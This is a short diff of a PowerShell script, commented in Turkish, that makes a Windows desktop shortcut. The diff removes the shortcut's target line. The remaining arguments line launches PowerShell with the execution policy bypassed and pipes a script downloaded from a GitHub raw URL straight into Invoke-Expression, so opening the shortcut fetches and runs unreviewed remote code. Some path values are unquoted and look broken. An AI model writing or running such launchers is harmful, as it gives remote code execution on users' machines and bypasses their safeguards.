@@ -12,7 +12,7 @@ $shell = New-Object -ComObject WScript.Shell
 
 # Kısayolu oluşturun
 $shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = C:\WINDOWS\System32\WindowsPowerShell\v1.0  # Kısayolun hedef yolu
+
 $shortcut.Arguments = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command "& { Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/main.ps1' | Invoke-Expression }"  # Kısayolun argümanları (bu kısmı ihtiyacınıza göre değiştirin)
 $shortcut.Save()
 
